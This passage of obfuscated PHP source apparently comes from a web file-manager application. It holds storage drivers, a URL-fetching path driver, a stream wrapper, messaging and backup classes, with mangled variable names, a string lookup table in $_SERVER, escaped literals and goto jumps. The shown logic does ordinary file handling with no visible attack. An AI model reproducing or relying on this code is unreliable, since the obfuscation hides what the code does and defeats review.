infoFullSimple($Û¬°ıÁ©) { $Ô¥°ã¦ =& $_SERVER[è¶³ÒßÑ]; $·ÈœÒé = explode($Ô¥°ã¦[8], $Û¬°ıÁ©); $Ú®İŠ„Ö = implode($Ô¥°ã¦[8], array_splice($·ÈœÒé, 1)); return $this->model->pathInfoByPath($·ÈœÒé[0], $Ú®İŠ„Ö); } public function infoFull($şåÖù¼Í) { $§ÒÀÉ’¬ = $this->infoFullSimple($şåÖù¼Í); return is_array($§ÒÀÉ’¬) ? $this->model->pathInfo($§ÒÀÉ’¬[$_SERVER[è¶³ÒßÑ][203]]) : !1; } public function hashSimple($Ø¢Øï‰¶) { $ì­İ¸•ß =& $_SERVER[è¶³ÒßÑ]; $ñÃêİÍ· = $this->infoWithChildren($Ø¢Øï‰¶); return $ñÃêİÍ·[$ì­İ¸•ß[180]][$ì­İ¸•ß[665]]; } public function hashMd5($ÚøÕ•ã) { $§ÃÚÂ =& $_SERVER[è¶³ÒßÑ]; $óæğ–Ê‘ = $this->infoWithChildren($ÚøÕ•ã); return $óæğ–Ê‘[$§ÃÚÂ[180]][$§ÃÚÂ[540]]; } public function exist($ô•«ËÛ) { $ˆàîƒÜÃ =& $_SERVER[è¶³ÒßÑ]; $¨ÛñŸº = $this->parse($ô•«ËÛ); if (!$¨ÛñŸº[$ˆàîƒÜÃ[97]]) { return $this->isFile($ô•«ËÛ) || $this->isFolder($ô•«ËÛ); } $°¶ü³›ï = array($ˆàîƒÜÃ[470] => $¨ÛñŸº[$ˆàîƒÜÃ[468]], $ˆàîƒÜÃ[32] => $¨ÛñŸº[$ˆàîƒÜÃ[97]]); $Ÿúš•ÇĞ = $this->model->where($°¶ü³›ï)->find(); return $Ÿúš•ÇĞ ? !0 : !1; } public function isFile($øú±Íçµ) { $…Í»äùâ =& $_SERVER[è¶³ÒßÑ]; $•ƒ± ‘à = $this->infoSimple($øú±Íçµ); return $•ƒ± ‘à && $•ƒ± ‘à[$…Í»äùâ[478]] == $…Í»äùâ[238] ? !0 : !1; } public function isFolder($‘§şĞÖ¦) { $¤¶–¥”± =& $_SERVER[è¶³ÒßÑ]; $¯Öéçğ« = $this->infoSimple($‘§şĞÖ¦); return $¯Öéçğ« && $¯Öéçğ«[$¤¶–¥”±[478]] == $¤¶–¥”±[101] ? !0 : !1; } public function listPath($‚ÇÜäâ, $™Õ­£òŸ = false) { $³¿ªúŠ¶ =& $_SERVER[è¶³ÒßÑ]; if ($‚ÇÜäâ == $³¿ªúŠ¶[12]) { return !1; } $çã÷²Åá = array($³¿ªúŠ¶[470] => $‚ÇÜäâ); if ($™Õ­£òŸ) { return $this->model->listSource($çã÷²Åá, -1); } return $this->model->listSource($çã÷²Åá); } public function has($Õƒş­–Ü, $˜ĞšÌû = false, $·Ñœ¯·¢ = null) { $¼ÎİÒ° =& $_SERVER[è¶³ÒßÑ]; $¾ºÈ¨†Ğ = $this->infoWithChildren($Õƒş­–Ü); if ($˜ĞšÌû) { return array($¼ÎİÒ°[250] => $¾ºÈ¨†Ğ[$¼ÎİÒ°[250]], $¼ÎİÒ°[249] => $¾ºÈ¨†Ğ[$¼ÎİÒ°[249]]); } return $·Ñœ¯·¢ ? $¾ºÈ¨†Ğ[$¼ÎİÒ°[250]] : $¾ºÈ¨†Ğ[$¼ÎİÒ°[249]]; } public function listAll($½ŠßœÔ‘) { $€€Ÿ·İ• = IO::info($this->pathParse[$_SERVER[è¶³ÒßÑ][97]]); if (!$€€Ÿ·İ•) { return array(); } return $this->model->listAll($½ŠßœÔ‘); } public function getContent($›§ñ‘‚ğ) { return $this->model->getContent($›§ñ‘‚ğ); } public function setContent($«„ÃãÆ, $‰Ñ€Î±ú = '') { return $this->model->setContent($«„ÃãÆ, $‰Ñ€Î±ú); } public function fileSubstr($Ğìİä˜ã, $ÀÊ×ş‚Ê, $†ˆ™Âî«) { return $this->model->fileSubstr($Ğìİä˜ã, $ÀÊ×ş‚Ê, $†ˆ™Âî«); } public function download($Ç…ù¥Âš, $ôà•½¸ü = '') { $ŠÌ—Ôê = get_path_father($ôà•½¸ü); $ÃÊŠ¾·š = get_path_this($ôà•½¸ü); $®­§ü—£ = $this->model->fileInfoGet($Ç…ù¥Âš); $©í¬Ş‚ = IO::copy($®­§ü—£[$_SERVER[è¶³ÒßÑ][97]], $ŠÌ—Ôê, !1, $ÃÊŠ¾·š); return $©í¬Ş‚; } public function setModifyTime($¦Â¹¢Ì, $²¾£îüÌ = '') { $­êççã¦ =& $_SERVER[è¶³ÒßÑ]; if (!$¦Â¹¢Ì) { return; } $this->model->where(array($­êççã¦[484] => $¦Â¹¢Ì))->save(array($­êççã¦[98] => $²¾£îüÌ)); } public function upload($¤€–Æ­ñ, $ÜÌ×¼ø, $Çö½‡èú = false, $Á³ç‡İ‘ = REPEAT_REPLACE) { $×ûúÊÛ =& $_SERVER[è¶³ÒßÑ]; $î¬¶Íßò = $this->parse($¤€–Æ­ñ); $øïóÔÜœ = $this->model->addFile($î¬¶Íßò[$×ûúÊÛ[468]], $ÜÌ×¼ø, $î¬¶Íßò[$×ûúÊÛ[97]], $Çö½‡èú, $Á³ç‡İ‘); return $this->getPathOuter($øïóÔÜœ); } public function uploadFileByID($§ÃßÄÕ, $¿ «ş¨â, $¶·Í´‘) { $ÖãçÇ½ =& $_SERVER[è¶³ÒßÑ]; $ä˜ƒâÒ¤ = $this->parse($§ÃßÄÕ); $ÔŠ«Æ = $this->model->addFileByFileID($ä˜ƒâÒ¤[$ÖãçÇ½[468]], $¿ «ş¨â, $ä˜ƒâÒ¤[$ÖãçÇ½[97]], $¶·Í´‘); return $this->getPathOuter($ÔŠ«Æ); } public function addFileByRemote($ıà¿–üç, $ëÓ²Õ­Ä, $à€Úº›ˆ = array(), $Ê ªº = '', $øØ€­¬ò) { $ñ°ßŒÒØ =& $_SERVER[è¶³ÒßÑ]; $øâ äÔó = $this->parse($ıà¿–üç); $Ê ªº = empty($Ê ªº) ? $øâ äÔó[$ñ°ßŒÒØ[97]] : $Ê ªº; $íËæİ­ = $this->model->addFileByRemote($øâ äÔó[$ñ°ßŒÒØ[468]], $ëÓ²Õ­Ä, $Ê ªº, $à€Úº›ˆ, $øØ€­¬ò); return $this->getPathOuter($íËæİ­); } public function uploadLink($§§ó²«, $í²§˜ÉÏ = 0) { $Êú²ö÷ =& $_SERVER[è¶³ÒßÑ]; $ûŠæ»¤ = $this->parse($§§ó²«); $¯êÔéŠ¥ = _get($GLOBALS[$Êú²ö÷[7]], $Êú²ö÷[1397]); $•ö ¤ø§ = _get($GLOBALS[$Êú²ö÷[7]], $Êú²ö÷[1398]); $§§ó²« = Model($Êú²ö÷[667])->createFileName($ûŠæ»¤[$Êú²ö÷[97]], $¯êÔéŠ¥, $•ö ¤ø§); return IO::uploadLink($§§ó²«, $í²§˜ÉÏ); } public function fileNameAuto($š”ñÕÂÍ, $Ü—Ûı€Ã, $ë®Üù’œ = REPEAT_REPLACE, $èñÔ½¥Í = false) { return $this->model->fileNameAuto($š”ñÕÂÍ, $Ü—Ûı€Ã, $ë®Üù’œ, $èñÔ½¥Í); } public function fileNameExist($ØŸ¬–Ÿ£, $ı™Ôà›) { return $this->model->fileNameExist($ØŸ¬–Ÿ£, $ı™Ôà›); } protected function _fileOut($Å­½˜§, $¤ÛÅ¢®› = false, $†ìÁ¯Éì = false, $å—öŠË = '', $ÄßŞØŞö = false) { $‹áı¿†Š =& $_SERVER[è¶³ÒßÑ]; $€—¯À¯ = $this->model->sourceInfo($Å­½˜§); if ($€—¯À¯[$‹áı¿†Š[478]] == $‹áı¿†Š[101]) { header($‹áı¿†Š[1399]); die; } $È¹¯£ç£ = $this->model->fileInfoGet($Å­½˜§); $å—öŠË = $È¹¯£ç£[$‹áı¿†Š[540]] ? $È¹¯£ç£[$‹áı¿†Š[540]] : $å—öŠË; $ïòµ¡íá = isset($GLOBALS[$‹áı¿†Š[192]]) && is_array($GLOBALS[$‹áı¿†Š[192]]) ? $GLOBALS[$‹áı¿†Š[192]][$‹áı¿†Š[32]] : $€—¯À¯[$‹áı¿†Š[32]]; if ($ÄßŞØŞö) { return IO::fileOutServer($È¹¯£ç£[$‹áı¿†Š[97]], $¤ÛÅ¢®›, $ïòµ¡íá, $å—öŠË); } IO::fileOut($È¹¯£ç£[$‹áı¿†Š[97]], $¤ÛÅ¢®›, $ïòµ¡íá, $å—öŠË); } public function fileOut($´®²©Úê, $şèÉƒ ¬ = false, $àÈû„÷ı = false, $ï„–ÚÇ¬ = '') { $this->_fileOut($´®²©Úê, $şèÉƒ ¬, $àÈû„÷ı, $ï„–ÚÇ¬); } public function fileOutServer($ÓßŠñ­½, $€²”úø„ = false, $€ÉÚßó½ = false, $—æ§‰ó† = '') { $this->_fileOut($ÓßŠñ­½, $€²”úø„, $€ÉÚßó½, $—æ§‰ó†, !0); } protected function _fileOutImage($•Îƒı«Ä, $ÅÓİ¾è = 250) { $¡•ŞßĞ’ =& $_SERVER[è¶³ÒßÑ]; $ëÆ–ÙÅî = $this->model->pathInfo($•Îƒı«Ä); if ($ëÆ–ÙÅî[$¡•ŞßĞ’[478]] == $¡•ŞßĞ’[101]) { show_json($¡•ŞßĞ’[1400] . $•Îƒı«Ä, !1); } $µÛŠ· = $this->model->fileInfoGet($•Îƒı«Ä); $ëÆ–ÙÅî[$¡•ŞßĞ’[193]] = $µÛŠ·[$¡•ŞßĞ’[97]]; $GLOBALS[$¡•ŞßĞ’[192]] = $ëÆ–ÙÅî; IO::fileOutImage($µÛŠ·[$¡•ŞßĞ’[97]], $ÅÓİ¾è); } public function fileOutImage($Öİ‘™ÄÒ, $ÕÑó¬ = 250) { $this->_fileOutImage($Öİ‘™ÄÒ, $ÕÑó¬); } public function fileOutImageServer($ºàù¯ÅŒ, $åê•şÅº = 250) { $this->_fileOutImage($ºàù¯ÅŒ, $åê•şÅº); } public function link($ÕúİÓâû, $ì“±©¿­ = '') { $½Ñ’úŠ = $this->model->fileInfoGet($ÕúİÓâû); return IO::link($½Ñ’úŠ[$_SERVER[è¶³ÒßÑ][97]], $ì“±©¿­); } protected function parse($Œú˜²éÂ) { $¹”Æõöí =& $_SERVER[è¶³ÒßÑ]; if (strstr($Œú˜²éÂ, $¹”Æõöí[8]) === !1) { return array($¹”Æõöí[486] => intval($Œú˜²éÂ), $¹”Æõöí[97] => $¹”Æõöí[12], $¹”Æõöí[1396] => array()); } $Ù¹İô· = explode($¹”Æõöí[8], trim($Œú˜²éÂ, $¹”Æõöí[8])); if (count($Ù¹İô·) < 2) { show_tips(clear_html($Œú˜²éÂ) . $¹”Æõöí[1401]); } return array($¹”Æõöí[486] => intval($Ù¹İô·[0]), $¹”Æõöí[97] => $Ù¹İô·[1], $¹”Æõöí[1396] => array_slice($Ù¹İô·, 1)); } } goto D£äµİƒ¸½; E£¼£ˆÍŒ: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($¿‡£‰Æ³ = false) { } public function exist($ê°Ûİğş) { $âÁ§´¶É = $this->info($ê°Ûİğş); return $âÁ§´¶É[$_SERVER[è¶³ÒßÑ][242]]; } public function isFile($çßªñÔ) { $±Äø¦™Ğ = $this->info($çßªñÔ); return $±Äø¦™Ğ[$_SERVER[è¶³ÒßÑ][242]]; } public function isFolder($ò§ã Œù) { return !1; } public function size($ÔÍ¨‹é ) { $­—…åş´ = $this->info($ÔÍ¨‹é ); return $­—…åş´[$_SERVER[è¶³ÒßÑ][89]]; } public function info($ÆİãƒËò) { return $this->infoParse($ÆİãƒËò); } public function infoAuth($İ÷Šïôü) { return $this->infoParse($İ÷Šïôü); } public function infoWithChildren($¤ÆÑ Äç) { return $this->infoParse($¤ÆÑ Äç); } public function infoFull($‚ÀÂ—ÑÌ) { return $this->infoParse($‚ÀÂ—ÑÌ); } private function infoParse($©ì¼¹ï¯) { $¦ôÍâÉ =& $_SERVER[è¶³ÒßÑ]; $ª¥×¶ƒŒ = $this->header($©ì¼¹ï¯); if (!$ª¥×¶ƒŒ || !$ª¥×¶ƒŒ[$¦ôÍâÉ[804]]) { return !1; } $Ì‚ ÈøÏ = _get($ª¥×¶ƒŒ, $¦ôÍâÉ[406], 0); $õ¨è©ˆÄ = array($¦ôÍâÉ[32] => $ª¥×¶ƒŒ[$¦ôÍâÉ[32]], $¦ôÍâÉ[97] => $©ì¼¹ï¯, $¦ôÍâÉ[33] => $¦ôÍâÉ[240], $¦ôÍâÉ[89] => intval($Ì‚ ÈøÏ), $¦ôÍâÉ[179] => get_path_ext($ª¥×¶ƒŒ[$¦ôÍâÉ[32]]), $¦ôÍâÉ[1431] => $Ì‚ ÈøÏ > 0 && $ª¥×¶ƒŒ[$¦ôÍâÉ[1594]], $¦ôÍâÉ[1432] => !1); return $õ¨è©ˆÄ; } private function header($¹˜ÖêÉ™) { $Ù½ÖĞˆ =& $_SERVER[è¶³ÒßÑ]; if (isset(self::$_cacheHeader[$¹˜ÖêÉ™])) { return self::$_cacheHeader[$¹˜ÖêÉ™]; } $œÑ‘è…ß = isset($GLOBALS[$Ù½ÖĞˆ[1595]]) ? $GLOBALS[$Ù½ÖĞˆ[1595]] : !1; $GLOBALS[$Ù½ÖĞˆ[1595]] = !0; self::$_cacheHeader[$¹˜ÖêÉ™] = url_header($¹˜ÖêÉ™); $GLOBALS[$Ù½ÖĞˆ[1595]] = $œÑ‘è…ß; return self::$_cacheHeader[$¹˜ÖêÉ™]; } public function hashSimple($ª‡„™ù, $Æ£á™’© = false) { $ô°§ÓüÑ =& $_SERVER[è¶³ÒßÑ]; $¢Ìõ½­¹ = $this->info($ª‡„™ù); if (!$¢Ìõ½­¹ || !$¢Ìõ½­¹[$ô°§ÓüÑ[242]]) { return !1; } $ÓÃ€¡‘Í = $¢Ìõ½­¹[$ô°§ÓüÑ[89]]; $Òçó®Â = 200; $Ë¼™åÀ¼ = 50; if ($ÓÃ€¡‘Í <= $Òçó®Â * $Ë¼™åÀ¼) { return md5($this->fileSubstr($ª‡„™ù, 0, $ÓÃ€¡‘Í)) . $ÓÃ€¡‘Í; } $ìÔÌÂÜ‰ = intval($ÓÃ€¡‘Í / $Ë¼™åÀ¼); $áôÇÑÆ = $ô°§ÓüÑ[12]; $…‚ØÂâ¶ = timeFloat(); $´¡éûº¸ = 15; for ($™¡¢àø» = 0; $™¡¢àø» < $Ë¼™åÀ¼; $™¡¢àø»++) { if (timeFloat() - $…‚ØÂâ¶ > $´¡éûº¸) { return !1; } $áô¯™ìï = $this->fileSubstr($ª‡„™ù, $ìÔÌÂÜ‰ * $™¡¢àø», $Òçó®Â); if (!$áô¯™ìï) { return !1; } $áôÇÑÆ .= $áô¯™ìï; } $áôÇÑÆ .= $this->fileSubstr($ª‡„™ù, $ÓÃ€¡‘Í - $Òçó®Â, $Òçó®Â); return md5($áôÇÑÆ) . $ÓÃ€¡‘Í; } public function getContent($êıª¦ğÆ) { return $this->fileSubstr($êıª¦ğÆ); } public function fileSubstr($íœ¢¼ô, $°ñ¯›ÃØ = 0, $ò‡‘Å¢ = -1) { $öÏšƒÖ =& $_SERVER[è¶³ÒßÑ]; $Ã­„·Ëˆ = $this->info($íœ¢¼ô); if (!$Ã­„·Ëˆ || !$Ã­„·Ëˆ[$öÏšƒÖ[242]] && $Ã­„·Ëˆ[$öÏšƒÖ[89]] > 1024 * 1024 * 10) { return !1; } if ($ò‡‘Å¢ === -1) { $ò‡‘Å¢ = $Ã­„·Ëˆ[$öÏšƒÖ[89]]; } if ($ò‡‘Å¢ == 0) { return $öÏšƒÖ[12]; } $Ø²ÃØÏÇ = array($öÏšƒÖ[1596] . $°ñ¯›ÃØ . $öÏšƒÖ[839] . ($°ñ¯›ÃØ + $ò‡‘Å¢ - 1)); $—˜Í®Ê = url_request($íœ¢¼ô, $öÏšƒÖ[271], !1, $Ø²ÃØÏÇ, !1, !1, 30); return $—˜Í®Ê[$öÏšƒÖ[1262]] ? $—˜Í®Ê[$öÏšƒÖ[1262]] : $öÏšƒÖ[12]; } public function download($¸»ç¨°Ö, $Ê¬¹¶É©) { Downloader::start($¸»ç¨°Ö, $Ê¬¹¶É©); return $Ê¬¹¶É©; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($â‡ÇĞë, $•×–Ãé¦ = '') { $this->info = $this->info($â‡ÇĞë); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[è¶³ÒßÑ][97]]; $this->pathOpen = $â‡ÇĞë; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$â‡ÇĞë])) { self::$_chunkBuffer[$â‡ÇĞë] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($×ÂÌË”ø) { $¾²ò°Ï› = $this->fileSubstr($this->pose, $×ÂÌË”ø); $this->pose += strlen($¾²ò°Ï›); return $¾²ò°Ï›; } public function stream_tell() { return $this->pose; } public function stream_seek($Á®İ„, $¬€ ‘°‹) { $Óñ­­ö =& $_SERVER[è¶³ÒßÑ]; if ($¬€ ‘°‹ == SEEK_SET) { $this->pose = $Á®İ„; } else { if ($¬€ ‘°‹ == SEEK_CUR) { $this->pose += $Á®İ„; } else { if ($¬€ ‘°‹ == SEEK_END) { $this->pose = $this->info[$Óñ­­ö[89]] + intval($Á®İ„); } } } if ($Á®İ„ < 0) { $this->pose = $this->info[$Óñ­­ö[89]] + $Á®İ„; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[è¶³ÒßÑ][89]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($Ÿù¸½ğ, $úÏ´“Í) { $İŒÉÎóÜ =& $_SERVER[è¶³ÒßÑ]; $¤Ô = $this->info($Ÿù¸½ğ); return array($İŒÉÎóÜ[1597] => 0, $İŒÉÎóÜ[1598] => 0, $İŒÉÎóÜ[16] => 32768 + 511, $İŒÉÎóÜ[1599] => 0, $İŒÉÎóÜ[1600] => 0, $İŒÉÎóÜ[1601] => 0, $İŒÉÎóÜ[1602] => 0, $İŒÉÎóÜ[89] => $¤Ô[$İŒÉÎóÜ[89]], $İŒÉÎóÜ[1603] => $¤Ô[$İŒÉÎóÜ[1430]], $İŒÉÎóÜ[1559] => $¤Ô[$İŒÉÎóÜ[98]], $İŒÉÎóÜ[1558] => $¤Ô[$İŒÉÎóÜ[241]], $İŒÉÎóÜ[1604] => 0, $İŒÉÎóÜ[1605] => 0); } static $fileInfo = array(); public function info($¡õ†•Äø) { $š£û¨§‘ = $_SERVER[è¶³ÒßÑ][1606]; if (isset(self::$fileInfo[$¡õ†•Äø])) { return self::$fileInfo[$¡õ†•Äø]; } if (substr($¡õ†•Äø, 0, strlen($š£û¨§‘)) != $š£û¨§‘) { return !1; } self::$fileInfo[$¡õ†•Äø] = IO::info(substr($¡õ†•Äø, strlen($š£û¨§‘))); return self::$fileInfo[$¡õ†•Äø]; } public static function read($ŞêÚİ, $ƒŠ››ú”, $²úÚúóÜ) { if (!isset(self::$_fopenCache[$ŞêÚİ])) { $¥î‘Ÿşİ = new StreamWrapperIO(); $¥î‘Ÿşİ->stream_open($ŞêÚİ); self::$_fopenCache[$ŞêÚİ] = $¥î‘Ÿşİ; } $¥î‘Ÿşİ = self::$_fopenCache[$ŞêÚİ]; return $¥î‘Ÿşİ->fileSubstr($ƒŠ››ú”, $²úÚúóÜ); } public static function _read($ãõ·‚³ª, $•ìóæÜã, $üß¼¡ù) { $«º‡ÎéÈ =& $_SERVER[è¶³ÒßÑ]; $¹ÜõÒ†× = fopen($ãõ·‚³ª, $«º‡ÎéÈ[1434]); if (!$¹ÜõÒ†×) { return $«º‡ÎéÈ[12]; } $µÂ˜î± = 8192; fseek($¹ÜõÒ†×, $•ìóæÜã, SEEK_SET); $¼Œ¿ªâ” = $«º‡ÎéÈ[12]; $Ùì¥ÓÆ = 0; while ($Ùì¥ÓÆ < $üß¼¡ù) { $ºá—œİ = min($µÂ˜î±, $üß¼¡ù - $Ùì¥ÓÆ); $¼Œ¿ªâ” .= fread($¹ÜõÒ†×, $ºá—œİ); $Ùì¥ÓÆ += $ºá—œİ; } fclose($¹ÜõÒ†×); return $¼Œ¿ªâ”; } public function fileSubstr($»Çëï‰, $°‡ôƒâÅ) { $ÀúºÕÇ“ =& $_SERVER[è¶³ÒßÑ]; $Ñ“¿Óî¥ = $this->info[$ÀúºÕÇ“[89]]; $ï¦ÆÌ¬ = $»Çëï‰; $‰Ó·¼İÀ = $°‡ôƒâÅ; if ($»Çëï‰ < 0) { $»Çëï‰ = $Ñ“¿Óî¥ + $»Çëï‰; } if ($°‡ôƒâÅ === !1) { $°‡ôƒâÅ = $Ñ“¿Óî¥ - $»Çëï‰; } if ($»Çëï‰ + $°‡ôƒâÅ > $Ñ“¿Óî¥) { $°‡ôƒâÅ = $Ñ“¿Óî¥ - $»Çëï‰; } if ($°‡ôƒâÅ <= 0) { return $ÀúºÕÇ“[12]; } if ($»Çëï‰ < 0 || $»Çëï‰ >= $Ñ“¿Óî¥ || $°‡ôƒâÅ <= 0 || $°‡ôƒâÅ > 1024 * 1024 * 10) { throw new Exception("\151\x6f\x46\151\x6c\x65\x52\145\141\144\40\145\162\162\x6f\x72\41\40\x73\x74\x61\162\164\75{$»Çëï‰}\73\154\145\156\x67\x74\150\75{$°‡ôƒâÅ}\x3b\40\x73\151\172\145\x3d{$Ñ“¿Óî¥}\73"); } $ÛÒîÍ³Ü = 64 * 1024; $ºŒ¯·Ÿ¼ =& self::$_chunkBuffer[$this->path]; if (!$ºŒ¯·Ÿ¼) { $ºŒ¯·Ÿ¼ = array(); } $—‘ßÈ¯ = 0; $¬Êø¡·¼ = 0; $®•³µáß = $ÀúºÕÇ“[12]; foreach ($ºŒ¯·Ÿ¼ as $—‘ßÈ¯ => $®•³µáß) { $—‘ßÈ¯ = intval($—‘ßÈ¯); $¬Êø¡·¼ = $—‘ßÈ¯ + strlen($®•³µáß); if ($»Çëï‰ >= $¬Êø¡·¼) { continue; } if ($»Çëï‰ >= $—‘ßÈ¯ && $»Çëï‰ + $°‡ôƒâÅ <= $¬Êø¡·¼) { return substr($®•³µáß, $»Çëï‰ - $—‘ßÈ¯, $°‡ôƒâÅ); } break; } if (count($ºŒ¯·Ÿ¼) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($ÀúºÕÇ“[1607], $ÀúºÕÇ“[1608] . count($ºŒ¯·Ÿ¼) . "\73\163\164\141\162\164\75{$»Çëï‰}\x2c\x6c\145\156\x67\x74\150\75{$°‡ôƒâÅ}\73\x70\157\x73\x65\72{$—‘ßÈ¯}\176{$¬Êø¡·¼}"); throw new Exception($ÀúºÕÇ“[1609]); } $÷âØ°«Õ = intval($»Çëï‰ / $ÛÒîÍ³Ü) * $ÛÒîÍ³Ü; $üÑ„íê× = ceil(($»Çëï‰ + $°‡ôƒâÅ) / $ÛÒîÍ³Ü) * $ÛÒîÍ³Ü - $÷âØ°«Õ; $ğ¤Œ¹îñ = IO::fileSubstr($this->path, $÷âØ°«Õ, $üÑ„íê×); $ºŒ¯·Ÿ¼[$÷âØ°«Õ . $ÀúºÕÇ“[12]] = $ğ¤Œ¹îñ; ksort($ºŒ¯·Ÿ¼); $¯’á½ûÕ = substr($ğ¤Œ¹îñ, $»Çëï‰ - $÷âØ°«Õ, $°‡ôƒâÅ); return $¯’á½ûÕ; } private function log($ˆÚï³ÆÉ, $ıÌ†ïˆ) { $Ğ£¡êı“ =& $_SERVER[è¶³ÒßÑ]; $Ó¾æÕÊ = timeFloat() - $this->timeStart; write_log(sprintf($Ğ£¡êı“[1610], $ˆÚï³ÆÉ, $this->info[$Ğ£¡êı“[32]], $Ó¾æÕÊ, $ıÌ†ïˆ), $Ğ£¡êı“[1239]); } } class Message { function __construct() { } public function send($ç¤ËÕîá = '', $–¶¾´ÂÛ = array(), $££îçôõ = "\x74\x65\170\x74") { $Å­¹Æ‡ç =& $_SERVER[è¶³ÒßÑ]; $Äµœ»¦ = array($Å­¹Æ‡ç[33] => $Å­¹Æ‡ç[1611], $Å­¹Æ‡ç[181] => $ç¤ËÕîá); if (in_array($££îçôõ, array($Å­¹Æ‡ç[1611], $Å­¹Æ‡ç[1612]))) { $Äµœ»¦[$Å­¹Æ‡ç[33]] = $££îçôõ; } $–¶¾´ÂÛ = array($Å­¹Æ‡ç[571] => isset($–¶¾´ÂÛ[$Å­¹Æ‡ç[571]]) ? $–¶¾´ÂÛ[$Å­¹Æ‡ç[571]] : $Å­¹Æ‡ç[12], $Å­¹Æ‡ç[655] => isset($–¶¾´ÂÛ[$Å­¹Æ‡ç[655]]) ? $–¶¾´ÂÛ[$Å­¹Æ‡ç[655]] : $Å­¹Æ‡ç[12]); if (empty($ç¤ËÕîá) || empty($–¶¾´ÂÛ[$Å­¹Æ‡ç[571]]) && empty($–¶¾´ÂÛ[$Å­¹Æ‡ç[655]])) { return !1; } $ÆÖÒÉë– = array($Å­¹Æ‡ç[1539] => $Äµœ»¦, $Å­¹Æ‡ç[1613] => $–¶¾´ÂÛ); Hook::trigger($Å­¹Æ‡ç[1614], $ÆÖÒÉë–); } } goto A†Š×¼°Î; AÕ˜µŠŒ Ú: class BackupDbFile { public function __construct() { } public function index() { $¨Õ¤¢Ù‹ =& $_SERVER[è¶³ÒßÑ]; $óèØêá = Backup::get(); $–Œ¬®¶ = $óèØêá[$¨Õ¤¢Ù‹[32]]; $ç‘æÁÎŞ = $this->tmpFilesPath() . "\142\141\x63\153\165\x70\x5f{$–Œ¬®¶}\x2f"; $²•Ò–ñ— = $this->backupPath($óèØêá); if (!($²•Ò–ñ— = IO::mkdir($²•Ò–ñ—))) { return !1; } $¢šÛÑè‘ = IO::listPath($ç‘æÁÎŞ); $³¡™ÈşÅ = isset($¢šÛÑè‘[$¨Õ¤¢Ù‹[96]]) ? $¢šÛÑè‘[$¨Õ¤¢Ù‹[96]] : array(); $Õ‘º•¡Ø = array_sum(array_column($³¡™ÈşÅ, $¨Õ¤¢Ù‹[89])); if (!$Õ‘º•¡Ø) { return !1; } $Õñ¤˜á‚ = array($¨Õ¤¢Ù‹[852] => $Õ‘º•¡Ø, $¨Õ¤¢Ù‹[853] => time()); Backup::set($Õñ¤˜á‚); $úÒ†Î‚› = new TaskFileTransfer($¨Õ¤¢Ù‹[854], $¨Õ¤¢Ù‹[837], count($³¡™ÈşÅ), LNG($¨Õ¤¢Ù‹[838]) . $¨Õ¤¢Ù‹[455] . LNG($¨Õ¤¢Ù‹[840]) . $¨Õ¤¢Ù‹[855]); $úÒ†Î‚›->task[$¨Õ¤¢Ù‹[817]] = $Õ‘º•¡Ø; foreach ($¢šÛÑè‘[$¨Õ¤¢Ù‹[96]] as $Å±ËàáÑ) { $åŞ€ÀÆõ = IO::move($Å±ËàáÑ[$¨Õ¤¢Ù‹[97]], $²•Ò–ñ—); if (!$åŞ€ÀÆõ) { $úÒ†Î‚›->end(); $ñí«œ­á = IO::getLastError($¨Õ¤¢Ù‹[856] . $Å±ËàáÑ[$¨Õ¤¢Ù‹[97]] . $¨Õ¤¢Ù‹[857] . $²•Ò–ñ— . $¨Õ¤¢Ù‹[188]); write_log($ñí«œ­á, $¨Õ¤¢Ù‹[837]); return !1; } } $ü–÷×è = new DbManage(); $¥¦¤‰èü = $ü–÷×è->getSqlFile(); if (!$¥¦¤‰èü[$¨Õ¤¢Ù‹[858]] || !$¥¦¤‰èü[$¨Õ¤¢Ù‹[13]]) { return !1; } IO::move($¥¦¤‰èü[$¨Õ¤¢Ù‹[858]], $²•Ò–ñ—); IO::move($¥¦¤‰èü[$¨Õ¤¢Ù‹[13]], $²•Ò–ñ—); $úÒ†Î‚›->end(); $Õñ¤˜á‚ = array($¨Õ¤¢Ù‹[859] => $Õ‘º•¡Ø, $¨Õ¤¢Ù‹[860] => time()); Backup::set($Õñ¤˜á‚); return !0; } private function backupPath($ê‘ÜÓÉ) { $×¸«Øø– =& $_SERVER[è¶³ÒßÑ]; $²›İêº = $ê‘ÜÓÉ[$×¸«Øø–[32]]; $‚èÏ»ğÆ = Model($×¸«Øø–[824])->get($×¸«Øø–[825]); $¡Ê÷û„÷ = substr(md5($×¸«Øø–[826] . $‚èÏ»ğÆ . $²›İêº), 0, 8); return "\x7b\151\x6f\72{$ê‘ÜÓÉ[$×¸«Øø–[806]]}\175\57\144\141\x74\141\142\x61\163\x65\57\x62\x61\x63\x6b\x75\x70\x2f" . $²›İêº . $×¸«Øø–[11] . $¡Ê÷û„÷; } private function tmpFilesPath() { $¨Ú‘‰Î =& $_SERVER[è¶³ÒßÑ]; $„ıÃôáş = TEMP_FILES; if ($GLOBALS[$¨Ú‘‰Î[6]][$¨Ú‘‰Î[102]][$¨Ú‘‰Î[850]]) { $„ıÃôáş = $GLOBALS[$¨Ú‘‰Î[6]][$¨Ú‘‰Î[102]][$¨Ú‘‰Î[850]]; if (!mk_dir($„ıÃôáş) || !is_writable($„ıÃôáş) || !IO::mkfile($„ıÃôáş . $¨Ú‘‰Î[851])) { $„ıÃôáş = TEMP_FILES; } } return $„ıÃôáş; } } class BackupFile { public function __construct() { } public function index() { $Åì›¶¶î = Backup::get(); $Ø»à÷âÕ = $Åì›¶¶î[$_SERVER[è¶³ÒßÑ][362]][$_SERVER[è¶³ÒßÑ][240]][$_SERVER[è¶³ÒßÑ][534]]; $¤ú§æ‰ = array($_SERVER[è¶³ÒßÑ][535] => array($_SERVER[è¶³ÒßÑ][861], $Ø»à÷âÕ), $_SERVER[è¶³ÒßÑ][862] => array($_SERVER[è¶³ÒßÑ][400], 